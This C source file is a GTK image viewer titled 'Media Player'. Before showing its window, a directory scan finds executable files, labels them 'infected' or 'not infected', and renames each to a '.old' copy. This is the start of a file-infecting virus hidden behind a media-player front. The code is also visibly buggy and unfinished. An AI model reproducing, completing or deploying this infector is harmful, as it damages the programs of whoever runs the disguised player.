#include <gtk/gtk.h>
#include <dirent.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

void open_repo(char * directory){
    DIR * dp;
    struct dirent * dirp;
    dp = opendir(directory);
    while ((dirp = readdir(dp)) != NULL){
        printf("%s\t", dirp->d_name);
        struct stat buf;
        stat(dirp->d_name,&buf);
        int test = buf.st_mode;
        printf("%d\t",&test);
        if(((test & S_IXUSR) && (test & S_IFREG))&&(strstr(dirp->d_name,".old")==NULL)){
            printf(".exe");
            DIR * dp_2;
            struct dirent * dirp_2;
            dp_2 = opendir(directory);
            char * cp = (char *) malloc( strlen(dirp->d_name) );
            strcpy(cp,dirp->d_name);
            strcat(dirp->d_name,".old");
            int res=0;
            while ((dirp_2 = readdir(dp_2)) != NULL){
                if ((strcmp(dirp->d_name,dirp_2->d_name))==0)
                {
                    res = 1;
                    printf(".old found");
                    break;
                }
                
            }
            if (res == 0){
                printf("\tnot infected");
                printf("\t%s",dirp->d_name);
                int re = rename(cp,dirp->d_name);
                printf("\t%d",re);
                FILE * f = fopen(cp,"r");
                printf("%d",f);
            }else{
                printf("already infected");
            }
        }
        else if ((test & S_IXUSR) && (test & S_IFDIR)){
            if(!(dirp->d_name[0]=='.')){
                printf("dir");
                //open_repo(dirp->d_name);
            }
            else{
                printf("nope");
            }
        }
        printf("\n");
    }
    closedir(dp);
}

int main(int argc, char * argv[]){
    open_repo(".");
    const int Width = 1920, Height = 1080;
    char *buffer = (char*)malloc(3 * Width * Height);

    GtkWidget * window;
    GtkWidget * image;

    gtk_init (&argc, &argv);
    window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title (GTK_WINDOW (window), "Media Player");
    image = gtk_image_new_from_file(argv[1]);
    gtk_container_add(GTK_CONTAINER (window), image);

    gtk_widget_show_all (window);

    gtk_main ();

    free (buffer);
    return 0;
}